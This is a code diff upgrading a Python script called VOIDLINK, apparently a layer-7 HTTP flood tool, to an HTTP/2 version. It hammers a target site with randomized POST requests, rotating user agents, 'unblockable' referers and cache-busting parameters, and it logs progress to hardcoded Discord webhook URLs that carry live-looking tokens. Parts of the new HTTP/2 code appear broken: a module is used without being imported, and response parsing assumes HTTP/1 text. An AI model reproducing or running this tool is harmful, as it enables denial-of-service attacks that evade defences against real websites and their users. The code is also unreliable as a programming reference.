@@ -1,15 +1,18 @@
 #!/usr/bin/env python3
 """
-VOIDLINK - Stealth L7 Pinger
+MK2VOIDLINK - Stealth L7 Pinger (HTTP/2 Only)
 """
 
 import socket
+import ssl
 import time
 import random
 import string
 from datetime import datetime, timezone
 from colorama import init, Fore, Style
 import requests
+import h2.connection
+import h2.config
 
 init(autoreset=True)
 
@@ -17,11 +20,10 @@ init(autoreset=True)
 ORANGE = '\033[38;5;214m'
 BRIGHT_WHITE = Style.BRIGHT + Fore.WHITE
 
-class VoidLink:
+class MK2VoidLink:
     def __init__(self, target, webhook_url):
         self.target = target
         self.webhook_url = webhook_url
-        self.http_versions = ["HTTP/0.9", "HTTP/1.0", "HTTP/1.1"]
         self.last_log = 0
         self.last_discord_log = 0
         self.start_time = datetime.now()
@@ -32,10 +34,10 @@ class VoidLink:
         
         # User agents
         self.agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         ]
         
         # Unblockable referers
@@ -83,7 +85,7 @@ class VoidLink:
     def send_startup_webhook(self):
         """Send startup message to Discord"""
         embed = {
-            "title": f"🚀 MK1VOIDLINK - Session Started",
+            "title": f"🚀 MK2VOIDLINK (HTTP/2) - Session Started",
             "color": 0x00ff00,
             "fields": [
                 {
@@ -103,7 +105,7 @@ class VoidLink:
                 }
             ],
             "footer": {
-                "text": "VOIDLINK Monitoring Active"
+                "text": "MK2VOIDLINK • HTTP/2 Only"
             },
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
@@ -118,7 +120,7 @@ class VoidLink:
         running_time = str(datetime.now() - self.start_time).split('.')[0]
         
         embed = {
-            "title": f"📡 MK1VOIDLINK - ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) - (Session {self.session_id})",
+            "title": f"📡 MK2VOIDLINK (HTTP/2) - ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) - (Session {self.session_id})",
             "color": 0x3498db,
             "fields": [
                 {
@@ -153,7 +155,7 @@ class VoidLink:
                 }
             ],
             "footer": {
-                "text": f"Session {self.session_id} • Update every 2-5min"
+                "text": f"Session {self.session_id} • HTTP/2 • Update every 2-5min"
             },
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
@@ -168,52 +170,85 @@ class VoidLink:
         self.request_count += 1
         
         try:
-            # Build request
-            http_ver = random.choice(self.http_versions)
             rand_param = self.rand_str(8)
             
-            request = f"POST /?{rand_param} HTTP/1.1\r\n"
-            request += f"Host: {self.target}\r\n"
-            request += f"User-Agent: {random.choice(self.agents)}\r\n"
-            request += "Accept: text/html,application/xhtml+xml\r\n"
-            request += "Accept-Language: en-US,en;q=0.9\r\n"
-            request += "Cache-Control: no-cache\r\n"
-            request += f"Referer: {random.choice(self.refs)}\r\n"
-            request += "Connection: keep-alive\r\n"
-            request += "\r\n"
-            
-            payload = f"GET /?{rand_param} {http_ver}\r\n"
-            payload += f"Host: {self.target}\r\n"
-            payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
-            payload += "Accept: text/html,application/xhtml+xml\r\n"
-            payload += "Accept-Language: en-US,en;q=0.9\r\n"
-            payload += "Cache-Control: no-cache\r\n"
-            payload += "Connection: keep-alive\r\n\r\n"
+            # Setup SSL for HTTP/2
+            context = ssl.create_default_context()
+            context.set_alpn_protocols(['h2', 'http/1.1'])
+            context.set_npn_protocols(['h2', 'http/1.1'])
             
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
-            sock.connect((self.target, 80))
-            sock.send(request.encode() + payload.encode())
+            sock.connect((self.target, 443))
             
-            resp = b''
+            # Wrap socket with SSL
+            ssock = context.wrap_socket(sock, server_hostname=self.target)
+            
+            # Check if HTTP/2 was negotiated
+            if ssock.selected_alpn_protocol() != 'h2':
+                raise Exception("HTTP/2 not supported")
+            
+            # Create HTTP/2 connection
+            config = h2.config.H2Configuration(client_side=True)
+            conn = h2.connection.H2Connection(config=config)
+            conn.initiate_connection()
+            ssock.send(conn.data_to_send())
+            
+            # Build headers
+            headers = [
+                (':method', 'POST'),
+                (':path', f'/?{rand_param}'),
+                (':authority', self.target),
+                (':scheme', 'https'),
+                ('user-agent', random.choice(self.agents)),
+                ('accept', 'text/html,application/xhtml+xml'),
+                ('accept-language', 'en-US,en;q=0.9'),
+                ('cache-control', 'no-cache'),
+                ('referer', random.choice(self.refs)),
+                ('content-length', '0')
+            ]
+            
+            # Send request
+            stream_id = conn.get_next_available_stream_id()
+            conn.send_headers(stream_id, headers, end_stream=True)
+            ssock.send(conn.data_to_send())
+            
+            # Get response
+            resp_data = b''
             while True:
                 try:
-                    chunk = sock.recv(4096)
-                    if not chunk:
+                    data = ssock.recv(65535)
+                    if not data:
                         break
-                    resp += chunk
-                    if len(resp) > 1024*1024:
-                        break
+                    
+                    events = conn.receive_data(data)
+                    for event in events:
+                        if isinstance(event, h2.events.ResponseReceived):
+                            pass
+                        elif isinstance(event, h2.events.DataReceived):
+                            resp_data += event.data
+                            conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
+                    
+                    ssock.send(conn.data_to_send())
+                    
                 except:
                     break
-            sock.close()
+            
+            ssock.close()
             
             resp_time = (time.time() - start) * 1000
             
+            # Try to get status code from response
             try:
-                headers = resp.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
-                status = int(headers.split()[1])
-                all_headers = headers.lower()
+                # Parse first line for status
+                headers_end = resp_data.find(b'\r\n\r\n')
+                if headers_end != -1:
+                    first_line = resp_data[:resp_data.find(b'\r\n')].decode('utf-8', errors='ignore')
+                    status = int(first_line.split()[1])
+                    all_headers = resp_data[:headers_end].decode('utf-8', errors='ignore').lower()
+                else:
+                    status = 200
+                    all_headers = ''
             except:
                 status = 0
                 all_headers = ''
@@ -238,16 +273,16 @@ class VoidLink:
                 log_result = "intercepted"
             
             # Store last response info for Discord
-            self.last_response_info = f"{hit_text} | {self.format_size(len(resp))} | {resp_time:.2f}ms | {log_result}"
+            self.last_response_info = f"{hit_text} | {self.format_size(len(resp_data))} | {resp_time:.2f}ms | {log_result}"
             self.last_status = str(status)
             
             current_time = time.time()
             
             # Terminal output every 3 seconds
             if current_time - self.last_log >= 3:
-                print(f"VOIDLINK ---> ({hit_color}{hit_text}{Style.RESET_ALL}) ↓")
+                print(f"MK2VOIDLINK (H2) ---> ({hit_color}{hit_text}{Style.RESET_ALL}) ↓")
                 print(f"({resp_time:.2f}ms) ---> {status} ←")
-                print(f"({self.format_size(len(resp))}) ---> {result}")
+                print(f"({self.format_size(len(resp_data))}) ---> {result}")
                 print()
                 self.last_log = current_time
             
@@ -269,13 +304,14 @@ class VoidLink:
             
             # Terminal output every 3 seconds
             if current_time - self.last_log >= 3:
-                print(f"VOIDLINK ---> ({BRIGHT_WHITE}org-{self.target}{Style.RESET_ALL}) ↓")
+                print(f"MK2VOIDLINK (H2) ---> ({BRIGHT_WHITE}org-{self.target}{Style.RESET_ALL}) ↓")
                 print(f"({resp_time:.2f}ms) ---> 000 ←")
                 print(f"(0B) ---> {Fore.RED}intercepted{Style.RESET_ALL}")
+                print(f"Error: {str(e)[:50]}")
                 print()
                 self.last_log = current_time
             
-            # Discord logging every 2-5 minutes (120-300 seconds)
+            # Discord logging every 2-5 minutes
             if current_time - self.last_discord_log >= random.uniform(120, 300):
                 self.send_update_webhook()
                 self.last_discord_log = current_time
@@ -284,7 +320,7 @@ class VoidLink:
     
     def run(self):
         startup_time = self.start_time.strftime("%Y-%m-%d %H:%M:%S")
-        print(f"\n{Fore.CYAN}VOIDLINK ({startup_time}) - Target: {self.target} \\ Discord logging active (every 2-5min){Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN}MK2VOIDLINK (HTTP/2) ({startup_time}) - Target: {self.target} \\ Discord logging active (every 2-5min){Style.RESET_ALL}")
         print("=" * 60)
         
         try:
@@ -297,9 +333,9 @@ class VoidLink:
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 2:
-        print("Usage: python voidlink.py <target>")
+        print("Usage: python mk2voidlink.py <target>")
         sys.exit(1)
     
-    webhook = "https://discord.com/api/webhooks/1478909580103651515/7tE9nPxZfCQvoUhj33YRzMHXjpAgYecVpek9OSUGsC5wQ2RHo2oXF_oPCIbNtMgLTQUZ"
-    v = VoidLink(sys.argv[1], webhook)
+    webhook = "https://discord.com/api/webhooks/1478911049263612055/iAcn2jqsiWMonGi7Q74k2s4utvR5ERn2sdYOM3j0FqqwnkhugMsPJTfz3oNvrouCwYUr"
+    v = MK2VoidLink(sys.argv[1], webhook)
     v.run()
